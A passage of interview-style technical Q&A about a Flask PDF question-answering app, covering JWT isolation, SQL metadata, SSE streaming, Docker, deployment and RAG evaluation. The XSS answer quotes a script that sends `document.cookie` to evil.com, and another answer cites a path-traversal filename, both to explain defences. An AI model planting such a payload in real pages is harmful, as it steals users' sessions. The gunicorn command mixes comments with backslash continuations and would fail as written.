Celery worker:  process_pdf() → embed() → store() → notify

GET /tasks/<id> → poll status: pending / processing / done
WebSocket / SSE → push completion to client
```

Tools: **Celery** (task queue) + **Redis** (broker + result backend).

This way the API returns immediately, the heavy work happens in background workers, and the client polls or receives a push notification when indexing is complete.

---

**Q10. How would you add authentication so users only see their own documents?**

**A:**

**Step 1 — User model (SQLite or PostgreSQL):**
```python
users = {"user_id": {"email": "...", "password_hash": "..."}}
```

**Step 2 — JWT auth:**
```python
POST /auth/login  →  returns signed JWT {user_id, exp}
# Client sends:  Authorization: Bearer <token>
```

**Step 3 — Document isolation:**
```python
# Each chunk stores the owner's user_id:
chunk = {"user_id": "123", "doc_id": "...", "text": "..."}

# Search filters by user_id:
if chunk["user_id"] != current_user_id:
    continue
```

**Step 4 — FAISS isolation options:**
- **Filter at search time** (current approach extended): simple, works for moderate users
- **Separate FAISS index per user**: complete isolation, memory scales with users
- **Qdrant namespaces**: built-in multi-tenancy

---

**Q11. The system uses a JSON file for metadata. What are the risks and how would you fix them?**

**A:** **Risks:**
1. **Race conditions** — two simultaneous uploads could corrupt the JSON (both read, both modify, second write overwrites first's changes)
2. **No transactions** — if the server crashes mid-write, the JSON is corrupt
3. **No indexing** — finding "all chunks for doc_id X" requires a full scan
4. **Not scalable** — JSON doesn't support concurrent readers/writers

**Fix — SQLite or PostgreSQL:**
```sql
CREATE TABLE documents (
    doc_id TEXT PRIMARY KEY,
    user_id TEXT,
    name TEXT,
    page_count INTEGER,
    uploaded_at TIMESTAMP
);

CREATE TABLE chunks (
    id TEXT PRIMARY KEY,
    doc_id TEXT REFERENCES documents(doc_id),
    page INTEGER,
    text TEXT,
    faiss_idx INTEGER
);
CREATE INDEX idx_chunks_doc_id ON chunks(doc_id);
```

SQLite works for single-server deployments. PostgreSQL for multi-worker/multi-server.

---

### Section C — Flask & Python

---

**Q12. Explain Python generators and how they enable streaming HTTP responses.**

**A:** A generator function uses `yield` instead of `return`. It produces values one at a time, suspending between each:

```python
def count():
    yield 1
    yield 2
    yield 3

for n in count():
    print(n)   # prints 1, then 2, then 3
```

**Memory advantage:** A list would hold all values at once. A generator produces one value, yields it, pauses. For streaming 1000 tokens, a list allocates all 1000 strings upfront. A generator produces one token, the network sends it, memory is freed, next token is produced.

**Flask streaming pattern:**
```python
def generate():                              # generator function
    yield "data: first event\n\n"
    yield "data: second event\n\n"
    yield "data: [DONE]\n\n"

return Response(stream_with_context(generate()), mimetype="text/event-stream")
```

Flask's `Response` object accepts a generator and calls `next()` on it whenever the network is ready to receive more data — creating a true streaming HTTP response.

---

**Q13. What does `stream_with_context` do and why is it required?**

**A:** Flask maintains a **request context** — a thread-local object containing the current request's headers, cookies, form data, etc. When you return a generator from a route, Flask normally tears down the request context immediately after the route function returns — before the generator has finished producing values.

If the generator then tries to access `request`, `g`, or `current_app`, it raises `RuntimeError: Working outside of request context`.

`stream_with_context(gen)` wraps the generator to keep the request context alive for its entire lifetime:

```python
# Without — context gone before generator runs:
return Response(generate())               # ❌ RuntimeError if gen accesses request

# With — context stays alive:
return Response(stream_with_context(generate()))  # ✓
```

---

**Q14. How does `secure_filename` protect against attacks?**

**A:** Without sanitisation, an attacker could upload a file named `../../../../etc/passwd`, causing the server to write to a system file. Or `../app.py` to overwrite the application code.

`werkzeug.utils.secure_filename` strips:
- Path separators (`/`, `\`, `:`)
- Leading dots (`..`, `.hidden`)
- Null bytes (`\x00`)
- Special shell characters

```python
secure_filename("../../etc/passwd")   → "etc_passwd"
secure_filename("../app.py")          → "app.py"
secure_filename("my file (2).pdf")   → "my_file_2.pdf"
```

Additionally, this project deletes the file immediately after processing (`finally: os.remove(filepath)`), so even a sanitised-but-malicious filename has no persistent effect.

---

**Q15. What is a WSGI server? Why use gunicorn instead of Flask's development server?**

**A:** **WSGI** (Web Server Gateway Interface) is the Python standard defining how a web server calls a Python web application. Flask implements WSGI; gunicorn is a WSGI server.

**Flask's dev server:**
- Single-threaded — one request at a time
- Debug mode enabled by default — security risk (exposes interactive debugger)
- No signal handling — ungraceful shutdown
- Not optimised for sustained load

**Gunicorn:**
- Pre-fork worker model — spawns N worker processes at startup
- Proper SIGTERM handling — drains in-flight requests before shutting down
- Used in production at Instagram, Pinterest, Reddit
- Supports `--timeout` for slow requests (important for LLM calls)

```bash
gunicorn app:app \
    --bind 0.0.0.0:$PORT \
    --workers 1 \        # one worker (shared FAISS state)
    --timeout 120        # 2 min timeout for large PDFs or slow LLM
```

---

### Section D — JavaScript & Frontend

---

**Q16. Why use `fetch()` + `ReadableStream` instead of `EventSource` for SSE?**

**A:** The browser's built-in `EventSource` API is designed for SSE but has a hard limitation: **it only supports GET requests**. You cannot send a JSON body with the question, conversation history, model choice, and document filter.

`fetch()` with `ReadableStream` gives us full POST support:
```javascript
const resp = await fetch('/ask/stream', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ question, model, history, doc_id })
});
const reader = resp.body.getReader();
```

**Trade-off:** `EventSource` auto-reconnects on network failure. With `fetch()`, we handle reconnection manually. For a Q&A app this is acceptable — if the stream drops, the user just asks again.

---

**Q17. Explain the buffer accumulation pattern in the SSE reader.**

**A:** The network delivers data in arbitrary-sized chunks. A single `reader.read()` call might return:
- Half a line: `data: {"type":"to`
- Multiple complete lines and then a half
- Exactly one complete line

We can't parse incomplete lines. The buffer pattern:

```javascript
let buffer = '';

while (true) {
    const { done, value } = await reader.read();
    buffer += decoder.decode(value, { stream: true });
    
    const lines = buffer.split('\n');
    buffer = lines.pop();    // incomplete last element stays in buffer
    
    for (const line of lines) {    // only process complete lines
        if (line.startsWith('data: ')) { parse(line.slice(6)); }
    }
}
```

`lines.pop()` removes the last element (possibly incomplete) and saves it in `buffer`. On the next `read()`, new data is prepended to the saved fragment, completing the line.

---

**Q18. What is XSS and how does this project prevent it?**

**A:** **Cross-Site Scripting (XSS)** is when an attacker injects malicious JavaScript into a page via user-supplied content. If a PDF contained `<script>fetch('evil.com?c='+document.cookie)</script>` and we inserted it raw into `innerHTML`, the browser would execute it and steal cookies.

**Prevention in this project:**

1. **`esc()` function** — HTML-encodes dangerous characters before `innerHTML` insertion:
```javascript
"<script>alert(1)</script>"  →  "&lt;script&gt;alert(1)&lt;/script&gt;"
```

2. **`textContent` for streaming** — instead of `innerHTML`, streamed tokens are set via `element.textContent = text`. `textContent` never parses HTML — it always treats content as literal text.

These two together mean no user-supplied content ever executes as HTML or JavaScript.

---

### Section E — DevOps & Architecture

---

**Q19. What is Docker and what problem does it solve for this project?**

**A:** Docker packages an application and all its dependencies (Python version, pip packages, system libraries) into an **image** — a read-only blueprint. Running an image creates a **container** — an isolated, reproducible environment.

**Problem solved:** "It works on my machine." FAISS requires specific C++ libraries. `fastembed` needs ONNX Runtime. Getting these to install consistently across different OS versions, Python versions, and developer machines is painful. Docker standardises everything — the same image runs identically on a developer's laptop, a CI server, and a Render instance.

**Layer caching saves build time:**
```dockerfile
COPY requirements.txt .          # rarely changes
RUN pip install -r requirements.txt  # cached unless requirements.txt changes
COPY . .                         # changes with every code edit
```

If only `app.py` changed, Docker reuses the cached pip layer and only re-copies source files — saving 3–5 minutes per build.

---

**Q20. What is `100dvh` and why does it matter on mobile?**

**A:** `vh` (viewport height) = 1% of the browser viewport height. `100vh` = full viewport height. On desktop, this is stable.

On mobile browsers, the URL bar and navigation bar dynamically show/hide as you scroll. When the URL bar is visible, `100vh` is calculated *including* the URL bar height. When you assign `height: 100vh` to your app, the bottom portion gets hidden under the URL bar.

`dvh` (dynamic viewport height) = adjusts in real time as the browser chrome shows/hides. `100dvh` always equals the actual visible area.

Additionally, when the keyboard opens on mobile, it reduces the visible area. `100dvh` adjusts to this too, keeping the input bar above the keyboard. `100vh` doesn't, pushing the input below the keyboard.

```css
height: 100vh;   /* fallback for old browsers */
height: 100dvh;  /* modern: adjusts with keyboard and browser chrome */
```

---

**Q21. How does Render auto-deploy work?**

**A:**

1. You push a commit to the `main` branch on GitHub
2. GitHub fires a webhook to Render: "main branch was updated"
3. Render pulls the new code, runs: `pip install -r requirements.txt`
4. Render starts a new container with: `gunicorn app:app --bind 0.0.0.0:$PORT ...`
5. Render runs the health check: `GET /health` → must return 200
6. If health check passes, traffic is switched to the new container (zero-downtime)
7. Old container is stopped

This entire process takes ~3 minutes for this project.

**Critical: `PORT` environment variable.** Render injects the port to listen on as `$PORT`. The app must use this instead of hardcoding 5000:
```python
port = int(os.environ.get("PORT", 5000))   # default 5000 for local
app.run(host="0.0.0.0", port=port)         # must bind 0.0.0.0 not 127.0.0.1
```

---

### Section F — Advanced & Problem-Solving

---

**Q22. How would you evaluate the quality of this RAG system?**

**A:** RAG quality has two independent dimensions:

**Retrieval quality** (are we finding the right chunks?):
- **Recall@K** — of all relevant chunks, what fraction appear in top-K?
- **MRR** (Mean Reciprocal Rank) — how high up is the first relevant chunk?
- **Precision@K** — of the K chunks returned, what fraction are actually relevant?

**Generation quality** (is the answer good?):
- **Faithfulness** — is every claim in the answer supported by the retrieved context?
- **Answer relevance** — does the answer actually address the question?
- **Completeness** — does the answer cover all relevant information in the context?

**Tools:**
- **RAGAS** — Python library that automates all above metrics using an LLM as judge
- **TruLens** — open-source LLM evaluation framework
- **Human eval** — domain experts rate answer correctness on 1–5 scale

---

**Q23. How would you debug a case where some questions get good answers but others get irrelevant answers?**

**A:** This is a retrieval quality problem. Systematic debugging:

**Step 1 — Inspect retrieved chunks:**
The response already returns `sources` showing what was retrieved. Are the chunks actually relevant to the question? If not, retrieval is the bottleneck.

**Step 2 — Test embedding quality:**
```python
a = embed_query("What is the revenue?")
b = embed_query("Total sales for Q3 were $5M")
similarity = np.dot(a, b)
print(similarity)   # should be > 0.7 for semantically related phrases
```

If similarity is low for phrases you'd expect to match, the embedding model isn't well-suited for this domain.

**Step 3 — Inspect chunking:**
Is the answer in the document but split across chunk boundaries? Print the chunk surrounding the answer. If the relevant sentence is the last line of one chunk and the answer context is the first line of the next, increase overlap.

**Step 4 — Increase k:**
Try k=10 instead of k=5. More candidates give the retrieval a better chance of including the right chunk.

**Step 5 — Add reranking:**
Use a cross-encoder (e.g. `cross-encoder/ms-marco-MiniLM-L-6-v2`) to rerank the top-20 bi-encoder candidates. Cross-encoders are much better at relevance judgment.

**Step 6 — Improve chunking strategy:**
Switch from character-based to **semantic chunking** — split at sentence or paragraph boundaries rather than arbitrary character counts. This keeps complete thoughts in single chunks.

---

**Q24. Design a semantic caching layer to reduce API costs.**

**A:** Many users ask similar questions. Caching answers for semantically similar queries avoids redundant LLM calls:

```python
# cache.py
class SemanticCache:
    def __init__(self, threshold=0.95):
        self.entries = []       # [{embedding, answer, sources}]
        self.threshold = threshold

    def get(self, query_embedding):
        for entry in self.entries:
            sim = float(np.dot(query_embedding, entry["embedding"]))
            if sim >= self.threshold:
                return entry["answer"], entry["sources"]
        return None, None

    def set(self, query_embedding, answer, sources):
        self.entries.append({
            "embedding": query_embedding,
            "answer": answer,
            "sources": sources,
        })
```

**In production:** Store in Redis with TTL (time-to-live) so stale answers expire. Use a separate FAISS index for the cache queries. Library: **GPTCache** implements this pattern.

**Threshold tuning:** 0.95 is strict — only near-identical questions hit the cache. Lower (0.85) gets more cache hits but risks returning a subtly wrong cached answer for a different question.

---

**Q25. How would you add support for uploading entire websites (URL ingestion)?**

**A:**

**Pipeline:**
```
User submits URL
      ↓
requests.get(url) → HTML
      ↓
BeautifulSoup.get_text() → strip tags, ads, nav
      ↓
chunk_text() → same chunking as PDF
      ↓
fastembed.embed() → same embedding
      ↓
store.add_document() → same FAISS storage
```

**Implementation:**
```python
# rag/url_processor.py
import requests
from bs4 import BeautifulSoup

def process_url(url):
    resp = requests.get(url, timeout=10, headers={"User-Agent": "RAGBot/1.0"})
    soup = BeautifulSoup(resp.text, "html.parser")
    for tag in soup(["script", "style", "nav", "footer", "header"]):
        tag.decompose()
    text = soup.get_text(separator="\n", strip=True)
    return [{"page": 1, "text": text}]
```

**Additional considerations:**
- Respect `robots.txt`
- Rate limit crawling (don't hit the same site too fast)
- Handle JavaScript-rendered pages (use Playwright instead of requests)
- Detect and handle pagination for multi-page articles

---

**Q26. Compare synchronous Flask vs asynchronous FastAPI for this use case.**

**A:**

**Flask + gunicorn (synchronous):**
- Each gunicorn worker handles one request at a time
- During the Groq API call (~2s), the worker is blocked — can't handle other requests
- Solution: use multiple workers (but our FAISS singleton prevents this)
- Simple, widely understood, abundant tutorials

**FastAPI + uvicorn (asynchronous):**
- Single worker can handle thousands of concurrent connections
- `await resp.read()` suspends the coroutine while waiting for Groq — other requests run
- `async def` routes required; all I/O must be `async`
- Streaming: `StreamingResponse` with `async def` generator

```python
# FastAPI equivalent
@app.post("/ask/stream")
async def ask_stream(data: QuestionRequest):
    async def generate():
        yield f"data: {json.dumps(sources_event)}\n\n"
        async for token in astream_groq(messages):
            yield f"data: {json.dumps({'token': token})}\n\n"
        yield "data: [DONE]\n\n"
    return StreamingResponse(generate(), media_type="text/event-stream")
```

**Recommendation for this project:** Flask is fine for a portfolio demo. For production handling 100+ concurrent users, FastAPI + async Groq client + shared Qdrant would be the right stack.

---

**Q27. How does the system handle large PDFs (500+ pages)?**

**A:** Current behaviour:
- 500 pages × ~3000 chars/page = ~1.5M characters
- With 1000-char chunks and 200-char overlap: ~1875 chunks
- Embedding 1875 chunks: ~10–15 seconds on CPU
- The upload endpoint blocks for this entire time

**Improvements:**

1. **Async processing with task queue:**
   - Upload returns immediately with `{task_id}`
   - Celery worker processes in background
   - Client polls `/tasks/{id}` or receives SSE completion event

2. **Batch embedding:**
   fastembed already supports batching — pass all texts at once rather than one by one. Already done in this project.

3. **Progress reporting:**
   Flask SSE stream during upload showing processing progress (currently simulated with JS ticker; a real endpoint could push actual progress).

4. **Page limit:**
   For demo purposes, optionally limit to first 100 pages to keep indexing under 3 seconds.

---

**Q28. What is the `env(safe-area-inset-bottom)` CSS value and when is it needed?**

**A:** On iPhones without a home button (Face ID models), iOS reserves space at the bottom of the screen for the swipe gesture indicator — a small pill-shaped bar. This area is not part of the safe rendering zone.

`env(safe-area-inset-bottom)` is a CSS environment variable that iOS Safari sets to the height of this indicator (~34px on iPhone X and later, 0 on older phones or Android).

```css
.chat-input-area {
    padding-bottom: max(14px, env(safe-area-inset-bottom));
}
```

`max()` ensures at least 14px padding on all devices (for visual breathing room), and the larger safe area value on iPhones where needed. Without this, the input bar would sit behind the home indicator, making it hard to tap.

---

**Q29. How would you implement document versioning?**

**A:** The current system assigns a new UUID to every upload. Re-uploading the same PDF creates a second independent document.

**Versioning approach:**

1. Hash the PDF content: `hashlib.sha256(pdf_bytes).hexdigest()`
2. Check if any document with the same filename exists
3. If yes, offer "Replace" or "Add as new version"
4. On replace: `delete_document(old_id)` then index the new file
5. Track version history in metadata:

```python
documents[new_doc_id] = {
    "name": filename,
    "version": 2,
    "content_hash": "abc123",
    "replaces_doc_id": old_doc_id,   # audit trail
    ...
}
```

---

**Q30. What would you add if you had one more week to work on this project?**

**A:** Priority order based on production impact:

1. **PostgreSQL for metadata** — replace JSON file with a real database. Enables concurrent writes, proper indexing, ACID transactions.

2. **User authentication + document isolation** — JWT auth, each user sees only their own documents. Essential for any multi-user deployment.

3. **Async upload processing** — Celery + Redis task queue. Large PDFs currently block the server; this makes uploads non-blocking.

4. **Cross-encoder reranking** — add `cross-encoder/ms-marco-MiniLM-L-6-v2` as a second-stage reranker after FAISS retrieval. Significantly improves answer quality.

5. **Answer evaluation endpoint** — `POST /feedback {message_id, rating}` — collect thumbs up/down on answers. Use this data to fine-tune retrieval or prompts.

6. **DOCX and TXT support** — extend `document_processor.py` with python-docx and plain-text readers.

---

*End of Documentation — 30 questions, complete technical reference.*
